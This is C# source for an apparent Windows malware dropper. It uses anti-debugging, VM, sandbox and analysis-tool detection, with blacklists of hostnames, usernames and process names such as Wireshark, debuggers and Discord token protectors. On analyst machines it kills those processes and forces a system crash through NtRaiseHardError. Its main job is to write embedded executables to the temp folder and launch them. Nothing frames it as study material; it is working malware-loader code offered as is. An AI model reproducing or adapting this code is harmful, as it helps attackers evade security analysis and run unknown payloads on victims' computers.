using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.CodeDom.Compiler;
using System.Management;
using System.Reflection;
using System.Resources;

namespace zlz
{
    internal class Program
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            

            // AntiDebug
            if (Debugger.IsAttached)
            {
                Console.WriteLine("Debuging Detected!");
                Environment.Exit(0);
            }
            else
            {
                // Console.WriteLine("Debugger is not attached.");
            }

            //Blacklist EXE Script
            if (!blacklistexe())
            {
                // Console.WriteLine("No blacklisted processes detected. Continuing program...");
            }

            // Anti Analysis
            try
            {
                RunAntiAnalysis();
            }
            catch (Exception ex2)
            { 
                // Console.WriteLine("No Analysis Of Any Type was detected.");
            }
            

            // Blacklist Hostname
            string[] blacklistArray = {
            "bee7370c-8c0c-4",
            "desktop-nakffmt",
            "win-5e07cos9alr",
            "b30f0242-1c6a-4",
            "desktop-vrsqlag",
            "q9iatrkprh",
            "xc64zb",
            "desktop-d019gdm",
            "desktop-wi8clet",
            "server1",
            "lisa-pc",
            "john-pc",
            "desktop-b0t93d6",
            "desktop-1pykp29",
            "desktop-1y2433r",
            "wileypc",
            "work",
            "6c4e733f-c2d9-4",
            "ralphs-pc",
            "desktop-wg3myjs",
            "desktop-7xc6gez",
            "desktop-5ov9s0o",
            "qarzhrdbpj",
            "oreleepc",
            "archibaldpc",
            "julia-pc",
            "d1bnjkfvlh",
            "compname_5076",
            "desktop-vkeons4",
            "NTT-EFF-2W11WSS"
        };

            string hostname = Environment.MachineName;

            bool isBlacklisted = false;
            foreach (string blacklistedHostname in blacklistArray)
            {
                if (blacklistedHostname == hostname)
                {
                    isBlacklisted = true;
                    break;
                }
            }

            if (isBlacklisted)
            {
                // Console.WriteLine($"Hostname '{hostname}' is blacklisted.");
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
            }
            else
            {
                // Console.WriteLine($"Hostname '{hostname}' is not blacklisted.");
            }

            // PC Username Blacklist
            string username = Environment.UserName;

            string[] usernameblacklist = {
            "admin",
            "root",
            "superuser",
            "wdagutilityaccount",
            "abby",
            "peter wilson",
            "hmarc",
            "patex",
            "john-pc",
            "rdhj0cnfevzx",
            "keecfmwgj",
            "frank",
            "8nl0colnq5bq",
            "lisa",
            "john",
            "george",
            "pxmduopvyx",
            "8vizsm",
            "w0fjuovmccp5a",
            "lmvwjj9b",
            "pqonjhvwexss",
            "3u2v9m8",
            "julia",
            "heuerzl",
            "harry johnson",
            "j.seance",
            "a.monaldo",
            "tvm"
        };

            if (IsUsernameBlacklisted(username, usernameblacklist))
            {
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                Environment.Exit(0);
            }
            else
            {
                // Console.WriteLine("This username is not blacklisted.");
            }

            //IP Blacklist
            string blacklistUrl = "https://raw.githubusercontent.com/ThunderboltDev/IP-BLACKLIST/main/blacklist_ips.txt";

            string[] blacklist;
            try
            {
                blacklist = DownloadBlacklist(blacklistUrl);
                // Console.WriteLine("IP Blacklist loaded successfully.");
            }
            catch (Exception ex)
            {
                // Console.WriteLine($"Error downloading blacklist: {ex.Message}");
                Environment.Exit(0);
                return;
            }
            string ipAddress = GetPublicIPAddress();

            if (IsBlacklisted(ipAddress, blacklist))
            {
                // Console.WriteLine($"The IP address {ipAddress} is in the blacklist.");
                // Thread.Sleep(1000);
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                Environment.Exit(0);
            }
            else
            {
                // Console.WriteLine($"The IP address {ipAddress} is not in the blacklist.");
            }

            try
            {
                string[] exeFileNames = { "s.exe", "another.exe", "yet_another.exe" };
                ExtractEXE(exeFileNames);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex}");
            } 
        }

        static string[] DownloadBlacklist(string url)
        {
            using (WebClient client = new WebClient())
            {
                string downloadedText = client.DownloadString(url);
                return downloadedText.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            }
        }

        static bool IsBlacklisted(string ipAddress, string[] blacklist)
        {
            return blacklist.Contains(ipAddress);
        }
        static string GetPublicIPAddress()
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString("http://api.ipify.org/");
            }
        }
        static bool IsUsernameBlacklisted(string username, string[] blacklist)
        {
            foreach (string blacklistedName in blacklist)
            {
                if (username.ToLower() == blacklistedName.ToLower())
                {
                    return true;
                }
            }
            return false;
        }
        static bool blacklistexe()
        {
            bool foundBlacklistedProcess = false;

            string[] blacklistedProcesses = {
            "fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler",
            "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray",
            "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice",
            "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc",
            "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
            "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice",
            "vmwaretray", "discordtokenprotector"
        };

            foreach (var processName in blacklistedProcesses)
            {
                Process[] processes = Process.GetProcessesByName(processName);
                foreach (var process in processes)
                {
                    foundBlacklistedProcess = true;
                    process.Kill();
                }
            }

            if (foundBlacklistedProcess)
            {
                Environment.Exit(0); // Exit the program
            }

            return foundBlacklistedProcess;
        }
        
        public static void RunAntiAnalysis()
        {
            if (!zlz.Program.DetectManufacturer())
            {
                if (!zlz.Program.DetectSandboxie())
                {
                    if (!zlz.Program.IsXP())
                    {
                        if (!zlz.Program.anyrun())
                        {
                            return;
                        }
                    }
                }
            }
            Environment.FailFast(null);
        }
        private static bool anyrun()
        {
            try
            {
                string text = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
                return text.Contains("true");
            }
            catch (Exception ex)
            {
            }
            return false;
        }

        private static bool IsXP()
        {
            try
            {
                if (Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor == 1)
                {
                    return true; // Windows XP
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions, if necessary
            }
            return false; // Not Windows XP
        }

        public static bool DetectSandboxie()
        {
            bool result;
            try
            {
                if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
                {
                    result = true;
                }
                else
                {
                    result = false;
                }
            }
            catch (Exception ex)
            {
                result = false;
            }
            return result;
        }
        private static bool DetectManufacturer()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"].ToString().ToLower();
                        string model = obj["Model"].ToString().ToUpperInvariant();

                        if (manufacturer != "microsoft corporation" || !model.Contains("VIRTUAL"))
                        {
                            if (!manufacturer.Contains("vmware") && model != "VIRTUALBOX")
                            {
                                continue;
                            }
                        }
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return false;
        }
        static void ExtractEXE(string[] exeFileNames)
        {
            ResourceManager rm = new ResourceManager("zlz.Resources", Assembly.GetExecutingAssembly());

            foreach (string exeFileName in exeFileNames)
            {
                byte[] exeBytes = (byte[])rm.GetObject(exeFileName);

                if (exeBytes != null)
                {
                    string tempPath = Path.Combine(Path.GetTempPath(), exeFileName);

                    File.WriteAllBytes(tempPath, exeBytes);

                    RunExecutable(tempPath);
                }
                else
                {
                    Console.WriteLine($"Executable file '{exeFileName}' not found in resources.");
                }
            }
        }

        static void RunExecutable(string exePath)
        {
            try
            {
                Process.Start(exePath);
            }
            catch (Exception ex)
            {
                // Console.WriteLine($"Error running executable: {ex.Message}");
                Application.Exit();
            }
        }
    }
}